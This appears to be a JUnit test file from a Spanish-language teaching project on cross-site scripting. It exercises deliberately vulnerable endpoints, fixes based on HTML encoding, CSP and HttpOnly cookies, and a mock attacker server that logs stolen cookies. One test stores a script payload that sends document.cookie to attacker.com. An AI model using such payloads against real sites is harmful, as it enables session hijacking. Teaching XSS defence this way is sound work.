package com.ciberseguridad.xss;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MockMvc;

import static org.hamcrest.Matchers.containsString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest
@AutoConfigureMockMvc
class XssDemonstrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Test
    @DisplayName("🔴 VULNERABLE (Stored XSS): Guarda el payload malicioso sin sanitizar")
    void testVulnerableAlmacenaScriptSinEscapar() throws Exception {
        String payload = "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>";
        String jsonBody = "{\"autor\":\"Erick Atacante\",\"contenido\":\"" + payload.replace("\"", "\\\"") + "\"}";

        mockMvc.perform(post("/api/vulnerable/comentarios")
                .contentType(MediaType.APPLICATION_JSON)
                .content(jsonBody))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.comentario.contenido").value(payload));
    }

    @Test
    @DisplayName("🔴 VULNERABLE (HTML Render): El muro vulnerable concatena el script directamente")
    void testVulnerableMuroConcatenaScriptDirecto() throws Exception {
        mockMvc.perform(get("/vulnerable/muro-html"))
                .andExpect(status().isOk())
                .andExpect(content().contentTypeCompatibleWith(MediaType.TEXT_HTML));
    }

    @Test
    @DisplayName("🔴 VULNERABLE (Reflected XSS): Refleja parámetro sin sanitizar en la respuesta HTML")
    void testReflectedXssVulnerable() throws Exception {
        String queryPayload = "<script>alert('Reflected XSS')</script>";

        mockMvc.perform(get("/api/vulnerable/buscar").param("q", queryPayload))
                .andExpect(status().isOk())
                .andExpect(content().string(containsString(queryPayload)));
    }

    @Test
    @DisplayName("🟢 MITIGADO (HTML Encoding): Escapa caracteres peligrosos transformando <script> en &lt;script&gt;")
    void testMitigadoEscapaEntidadesHtml() throws Exception {
        String payload = "<script>alert('xss')</script>";
        String jsonBody = "{\"autor\":\"Usuario Seguro\",\"contenido\":\"" + payload.replace("\"", "\\\"") + "\"}";

        mockMvc.perform(post("/api/mitigado/comentarios")
                .contentType(MediaType.APPLICATION_JSON)
                .content(jsonBody))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.sanitizado").value(containsString("&lt;script&gt;")))
                .andExpect(jsonPath("$.sanitizado").value(containsString("&lt;/script&gt;")));
    }

    @Test
    @DisplayName("🟢 MITIGADO (Content Security Policy): Retorna la cabecera CSP exacta de la Diapositiva 6")
    void testMitigadoAplicaContentSecurityPolicy() throws Exception {
        mockMvc.perform(get("/mitigado/muro-csp-html"))
                .andExpect(status().isOk())
                .andExpect(header().exists("Content-Security-Policy"))
                .andExpect(header().string("Content-Security-Policy",
                        containsString("default-src 'self'; script-src 'self'")));
    }

    @Test
    @DisplayName("🟢 MITIGADO (Cookies HttpOnly): La cookie protegida incluye el flag HttpOnly")
    void testMitigadoConfiguraCookiesHttpOnly() throws Exception {
        mockMvc.perform(get("/api/mitigado/generar-cookies"))
                .andExpect(status().isOk())
                .andExpect(cookie().exists("cookie_segura_httponly"))
                .andExpect(cookie().httpOnly("cookie_segura_httponly", true))
                .andExpect(cookie().httpOnly("cookie_vulnerable_js", false));
    }

    @Test
    @DisplayName("🕵️ SERVIDOR ATACANTE (C2): Registra exitosamente la cookie exfiltrada")
    void testAttackerC2RegistraRobo() throws Exception {
        String cookieRobada = "victima_session_id=SECRET998877";

        mockMvc.perform(get("/api/attacker/steal").param("cookie", cookieRobada))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.estado").value("ROBO_REGISTRADO"))
                .andExpect(jsonPath("$.cookieCapturada").value(cookieRobada));

        mockMvc.perform(get("/api/attacker/logs"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$[0].cookie").value(cookieRobada));
    }
}
